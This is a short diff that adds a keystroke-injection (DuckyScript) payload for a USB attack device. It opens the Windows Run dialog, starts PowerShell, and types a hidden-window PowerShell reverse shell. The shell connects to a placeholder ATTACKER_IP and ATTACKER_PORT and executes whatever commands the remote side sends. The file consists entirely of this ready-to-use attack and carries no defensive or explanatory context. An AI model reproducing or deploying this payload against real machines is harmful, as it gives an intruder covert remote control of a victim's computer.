@@ -1,0 +1,9 @@
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 1000
+STRING Start-Process powershell.exe -ArgumentList  "`$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP', 'ATTACKER_PORT'); `$stream = `$client.GetStream(); [byte[]]`$bytes = 0..65535|%{0}; while((`$i = `$stream.Read(`$bytes, 0, `$bytes.Length)) -ne 0) { `$data = (New-Object Text.ASCIIEncoding).GetString(`$bytes, 0, `$i); `$sendback = (Invoke-Expression -Command `$data 2>&1 | Out-String); `$sendback2 = `$sendback + 'PS ' + (pwd).Path + '> '; `$sendbyte = ([text.encoding]::ASCII).GetBytes(`$sendback2); `$stream.Write(`$sendbyte, 0, `$sendbyte.Length); `$stream.Flush() }" -WindowStyle Hidden
+ENTER
+STRING exit
+
